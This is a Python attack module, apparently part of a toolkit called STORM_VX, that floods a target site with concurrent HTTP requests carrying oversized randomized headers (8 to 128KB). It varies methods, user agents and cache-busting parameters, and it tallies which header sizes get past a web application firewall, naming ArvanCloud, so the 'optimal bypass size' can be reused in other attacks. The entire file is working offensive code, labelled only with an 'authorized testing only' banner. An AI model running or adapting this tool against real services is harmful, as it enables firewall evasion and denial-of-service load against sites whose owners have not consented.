#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  VF Header Bomb — Header Bomb Attack Module                            ║
║  Part of the STORM_VX Toolkit                                          ║
║                                                                          ║
║  Sends requests with extremely large headers (up to 128KB+).           ║
║  WAFs and servers have header size limits; exceeding them causes       ║
║  errors. If WAF rejects some sizes but passes others, we can find     ║
║  the bypass sweet spot and use that header size for other attacks.     ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import string
from typing import Dict, Optional, List, Tuple
from urllib.parse import urlparse

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False


# ─── Color Codes ──────────────────────────────────────────────────────────────

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ─── User-Agent Pool ─────────────────────────────────────────────────────────

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


class HeaderBombAttacker:
    """
    Header Bomb Attack.

    Sends HTTP requests with extremely large headers to find the
    WAF's header size limit. The attack escalates from 8KB to 128KB,
    tracking which sizes get through and which are blocked.

    If a certain header size bypasses the WAF (e.g., WAF rejects
    at 64KB but passes 32KB), that size can be used for other attacks.

    ArvanCloud blocking codes: 403, 429, 500, 503
    Response code 431 = "Request Header Fields Too Large"
    """

    # Escalation sizes in KB
    SIZE_LEVELS_KB = [8, 16, 32, 64, 128]

    # Header name strategies
    HEADER_NAME_STRATEGIES = [
        # Custom X- headers
        lambda i: f"X-Custom-{i}",
        # Cookie-based
        lambda i: "Cookie" if i == 0 else f"X-Session-{i}",
        # Authorization-like
        lambda i: "Authorization" if i == 0 else f"X-Auth-{i}",
        # Referer-like
        lambda i: "Referer" if i == 0 else f"X-Referer-{i}",
        # Cache headers
        lambda i: f"X-Cache-Key-{i}",
        # ArvanCloud-specific
        lambda i: f"X-Arvan-{i}",
        # Forward headers
        lambda i: f"X-Forwarded-For-{i}",
    ]

    def __init__(self, url: str, workers: int = 50, header_size_kb: int = 64, timeout: int = 15):
        self.url = url
        self.workers = workers
        self.header_size_kb = header_size_kb
        self.timeout = timeout
        self.parsed = urlparse(url)
        self.host = self.parsed.hostname or ""

        # Stats tracking
        self.stats = {
            "total_requests": 0,
            "bypass_success": 0,
            "blocked": 0,
            "header_too_large": 0,  # 431 responses
            "server_error": 0,
            "timeout": 0,
            "errors": 0,
            "size_results": {},  # size_kb -> {"passed": N, "blocked": N}
            "optimal_size_kb": None,
        }
        self._lock = asyncio.Lock()
        self._start_time = 0.0

        # Initialize size results
        for size in self.SIZE_LEVELS_KB:
            self.stats["size_results"][str(size)] = {"passed": 0, "blocked": 0, "error": 0}

    async def _update_stats(self, key: str, delta: int = 1):
        async with self._lock:
            self.stats[key] = self.stats.get(key, 0) + delta

    async def _update_size_result(self, size_kb: int, result_type: str):
        """Update the result for a specific header size."""
        async with self._lock:
            key = str(size_kb)
            if key not in self.stats["size_results"]:
                self.stats["size_results"][key] = {"passed": 0, "blocked": 0, "error": 0}
            self.stats["size_results"][key][result_type] = self.stats["size_results"][key].get(result_type, 0) + 1

    async def _get_stats(self) -> Dict:
        async with self._lock:
            return dict(self.stats)

    def _generate_large_headers(self, target_size_kb: int) -> Dict[str, str]:
        """Generate a set of headers whose total size is approximately target_size_kb."""
        headers = {
            "User-Agent": random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Host": self.host,
        }

        target_bytes = target_size_kb * 1024
        current_bytes = sum(len(k) + len(v) + 4 for k, v in headers.items())  # +4 for ": " and "\r\n"

        strategy = random.choice(self.HEADER_NAME_STRATEGIES)
        header_index = 0

        while current_bytes < target_bytes:
            header_name = strategy(header_index)
            # Fill remaining space in this header value
            remaining = target_bytes - current_bytes - len(header_name) - 4
            if remaining <= 0:
                break

            # Cap individual header value at 32KB to avoid single-header limits
            value_size = min(remaining, 32 * 1024)
            value = "".join(random.choices(string.ascii_letters + string.digits + "=/+", k=value_size))
            headers[header_name] = value

            current_bytes += len(header_name) + value_size + 4
            header_index += 1

        return headers

    async def _header_bomb_worker(self, worker_id: int, stop_event: asyncio.Event):
        """Single worker that sends requests with large headers."""
        # Each worker cycles through different sizes
        size_index = worker_id % len(self.SIZE_LEVELS_KB)

        while not stop_event.is_set():
            # Determine the header size for this request
            size_kb = self.SIZE_LEVELS_KB[size_index]
            # Also respect the max configured size
            if size_kb > self.header_size_kb:
                size_kb = self.header_size_kb

            # Generate large headers
            headers = self._generate_large_headers(size_kb)

            try:
                timeout_obj = aiohttp.ClientTimeout(total=self.timeout)
                async with aiohttp.ClientSession(timeout=timeout_obj) as session:
                    method = random.choice(["GET", "POST", "PUT"])
                    path = self.parsed.path or "/"
                    path += f"{'&' if '?' in path else '?'}_={random.randint(100000, 999999)}"
                    target_url = f"{self.parsed.scheme}://{self.host}{path}"

                    if method == "GET":
                        async with session.get(target_url, headers=headers, ssl=False, allow_redirects=False) as resp:
                            await self._process_response(resp, size_kb)
                    elif method == "POST":
                        data = f"data={random.randint(100000, 999999)}"
                        async with session.post(target_url, headers=headers, data=data, ssl=False, allow_redirects=False) as resp:
                            await self._process_response(resp, size_kb)
                    else:
                        async with session.put(target_url, headers=headers, data=b"test", ssl=False, allow_redirects=False) as resp:
                            await self._process_response(resp, size_kb)

            except asyncio.TimeoutError:
                await self._update_stats("timeout")
                await self._update_size_result(size_kb, "error")

            except aiohttp.ClientPayloadError:
                await self._update_stats("errors")
                await self._update_size_result(size_kb, "error")

            except aiohttp.ClientError:
                await self._update_stats("errors")
                await self._update_size_result(size_kb, "error")

            except OSError:
                await self._update_stats("errors")
                await self._update_size_result(size_kb, "error")

            except Exception:
                await self._update_stats("errors")
                await self._update_size_result(size_kb, "error")

            # Rotate to next size
            size_index = (size_index + 1) % len(self.SIZE_LEVELS_KB)

            # Brief pause
            await asyncio.sleep(random.uniform(0.01, 0.05))

    async def _process_response(self, resp: aiohttp.ClientResponse, size_kb: int):
        """Process a response and categorize it."""
        await self._update_stats("total_requests")
        status = resp.status

        if status == 431:
            # Request Header Fields Too Large
            await self._update_stats("header_too_large")
            await self._update_size_result(size_kb, "blocked")
        elif status in (403, 429, 500, 503):
            # WAF block
            await self._update_stats("blocked")
            await self._update_size_result(size_kb, "blocked")
        elif status >= 500:
            await self._update_stats("server_error")
            await self._update_size_result(size_kb, "blocked")
        elif status < 400:
            # Request went through! Bypass success
            await self._update_stats("bypass_success")
            await self._update_size_result(size_kb, "passed")
        else:
            # 4xx other than WAF block — could be legitimate
            await self._update_size_result(size_kb, "blocked")

    async def _analyze_optimal_size(self):
        """Analyze results to find the optimal bypass header size."""
        stats = await self._get_stats()
        size_results = stats.get("size_results", {})

        best_size = None
        best_ratio = -1

        for size_kb_str, results in size_results.items():
            passed = results.get("passed", 0)
            blocked = results.get("blocked", 0)
            total = passed + blocked
            if total >= 3:  # Need at least 3 samples
                ratio = passed / total
                if ratio > best_ratio and passed > 0:
                    best_ratio = ratio
                    best_size = int(size_kb_str)

        if best_size is not None:
            async with self._lock:
                self.stats["optimal_size_kb"] = best_size

    async def _print_stats(self, stop_event: asyncio.Event):
        """Print real-time statistics."""
        while not stop_event.is_set():
            elapsed = time.time() - self._start_time
            stats = await self._get_stats()

            total = stats.get("total_requests", 0)
            bypass = stats.get("bypass_success", 0)
            blocked = stats.get("blocked", 0)
            too_large = stats.get("header_too_large", 0)
            rps = total / max(elapsed, 1)
            optimal = stats.get("optimal_size_kb")

            print(
                f"{C.R}[HEADER-BOMB]{C.RS} "
                f"{C.BD}t={elapsed:.0f}s{C.RS} | "
                f"Total: {C.W}{total}{C.RS} ({rps:.1f}/s) | "
                f"Bypass: {C.G}{bypass}{C.RS} | "
                f"Blocked: {C.R}{blocked}{C.RS} | "
                f"431: {C.Y}{too_large}{C.RS} | "
                f"Optimal: {C.G if optimal else C.DM}{optimal or 'N/A'}KB{C.RS}"
            )

            # Print size breakdown
            size_results = stats.get("size_results", {})
            size_line_parts = []
            for size_kb in self.SIZE_LEVELS_KB:
                r = size_results.get(str(size_kb), {})
                passed = r.get("passed", 0)
                blocked_count = r.get("blocked", 0)
                total_s = passed + blocked_count
                if total_s > 0:
                    ratio = passed / total_s * 100
                    color = C.G if ratio > 50 else C.Y if ratio > 20 else C.R
                    size_line_parts.append(f"{size_kb}KB:{color}{ratio:.0f}%{C.RS}")
            if size_line_parts:
                print(f"  Sizes: {' | '.join(size_line_parts)}")

            await self._analyze_optimal_size()
            await asyncio.sleep(3)

    async def attack(self, stop_event: asyncio.Event, stats_callback=None) -> Dict:
        """
        Main attack entry point.

        Args:
            stop_event: Event to signal graceful shutdown.
            stats_callback: Optional callback for external stats reporting.

        Returns:
            Dict with attack statistics.
        """
        self._start_time = time.time()

        print(f"{C.BD}[HEADER-BOMB] Starting Header Bomb attack{C.RS}")
        print(f"  Target: {C.CY}{self.host}{C.RS}")
        print(f"  Workers: {C.W}{self.workers}{C.RS}")
        print(f"  Max header size: {C.W}{self.header_size_kb}KB{C.RS}")
        print(f"  Timeout: {C.W}{self.timeout}s{C.RS}")
        print(f"  Escalation: {C.DM}{' -> '.join(f'{s}KB' for s in self.SIZE_LEVELS_KB)}{C.RS}")
        print(f"  Strategy: Find header size that bypasses WAF{C.RS}")

        # Launch worker tasks
        tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self._header_bomb_worker(i, stop_event))
            tasks.append(task)

        # Stats printer
        stats_task = asyncio.create_task(self._print_stats(stop_event))

        # Wait for stop signal
        try:
            await stop_event.wait()
        except asyncio.CancelledError:
            pass

        # Cleanup
        stats_task.cancel()
        for task in tasks:
            task.cancel()

        await asyncio.gather(stats_task, *tasks, return_exceptions=True)

        # Final analysis
        await self._analyze_optimal_size()

        # Final stats
        elapsed = time.time() - self._start_time
        final_stats = await self._get_stats()
        final_stats["elapsed_seconds"] = round(elapsed, 2)
        final_stats["requests_per_second"] = round(
            final_stats.get("total_requests", 0) / max(elapsed, 1), 2
        )
        final_stats["bypass_rate"] = round(
            final_stats.get("bypass_success", 0) / max(final_stats.get("total_requests", 1), 1) * 100, 2
        )

        print(f"\n{C.BD}[HEADER-BOMB] Attack finished{C.RS}")
        print(f"  Total requests: {C.W}{final_stats.get('total_requests', 0)}{C.RS}")
        print(f"  Bypass success: {C.G}{final_stats.get('bypass_success', 0)}{C.RS}")
        print(f"  WAF blocked: {C.R}{final_stats.get('blocked', 0)}{C.RS}")
        print(f"  431 (too large): {C.Y}{final_stats.get('header_too_large', 0)}{C.RS}")
        print(f"  Bypass rate: {C.G}{final_stats.get('bypass_rate', 0)}%{C.RS}")

        optimal = final_stats.get("optimal_size_kb")
        if optimal:
            print(f"  {C.G}{C.BD}Optimal bypass size: {optimal}KB{C.RS}")
        else:
            print(f"  {C.Y}No optimal bypass size found — WAF may block all oversized headers{C.RS}")

        # Print per-size results
        print(f"  Size breakdown:")
        size_results = final_stats.get("size_results", {})
        for size_kb in self.SIZE_LEVELS_KB:
            r = size_results.get(str(size_kb), {})
            passed = r.get("passed", 0)
            blocked_count = r.get("blocked", 0)
            total_s = passed + blocked_count
            if total_s > 0:
                print(f"    {size_kb}KB: passed={C.G}{passed}{C.RS} blocked={C.R}{blocked_count}{C.RS} ratio={C.CY}{passed/total_s*100:.1f}%{C.RS}")

        if stats_callback:
            await stats_callback(final_stats)

        return final_stats
